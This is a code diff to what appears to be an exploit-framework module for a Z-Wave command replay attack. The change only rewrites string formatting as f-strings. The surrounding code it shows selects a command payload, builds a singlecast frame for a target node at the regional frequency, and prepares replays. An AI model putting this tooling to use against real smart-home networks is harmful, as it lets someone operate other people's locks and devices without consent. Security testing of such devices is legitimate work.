@@ -106,13 +106,13 @@ class Exploit(Exploit):
         custom = self.custom_payload.strip()
         if custom:
             try:
-                return bytes.fromhex(custom), "Custom (0x{})".format(custom[:16])
+                return bytes.fromhex(custom), f"Custom (0x{custom[:16]})"
             except ValueError:
                 return None, "Hex inválido"
         cmd_key = self.command.strip().lower()
         if cmd_key in _COMMON_COMMANDS:
             return _COMMON_COMMANDS[cmd_key]
-        return None, "Comando desconhecido: {}".format(cmd_key)
+        return None, f"Comando desconhecido: {cmd_key}"
 
     @mute
     def check(self):
@@ -123,22 +123,22 @@ class Exploit(Exploit):
         print_status("Z-Wave Command Replay Attack")
         hid = self._parse_home_id()
         if hid is None:
-            print_error("Home ID inválido: {}".format(self.home_id))
+            print_error(f"Home ID inválido: {self.home_id}")
             return
         payload, cmd_desc = self._get_command_payload()
         if payload is None:
-            print_error("Comando inválido: {}".format(cmd_desc))
+            print_error(f"Comando inválido: {cmd_desc}")
             return
 
         freq = 908420000 if self.region.strip().upper() == "US" else 868420000
-        print_info("Home ID: 0x{:08X}".format(hid))
-        print_info("Nó fonte: {}, Nó alvo: {}".format(self.src_node, self.dst_node))
-        print_info("Comando: {} ({})".format(self.command, cmd_desc))
-        print_info("Frequência: {} Hz ({})".format(freq, self.region))
+        print_info(f"Home ID: 0x{hid:08X}")
+        print_info(f"Nó fonte: {self.src_node}, Nó alvo: {self.dst_node}")
+        print_info(f"Comando: {self.command} ({cmd_desc})")
+        print_info(f"Frequência: {freq} Hz ({self.region})")
 
         frame = _build_zwave_singlecast(hid, int(self.src_node), int(self.dst_node), payload)
-        print_info("Z-Wave frame: {} bytes".format(len(frame)))
-        print_info("Frame hex: {}".format(frame.hex()))
+        print_info(f"Z-Wave frame: {len(frame)} bytes")
+        print_info(f"Frame hex: {frame.hex()}")
 
         headers = ["Replay #", "Frame Size", "Comando", "Frame (hex, primeiros 24B)"]
         rows = [
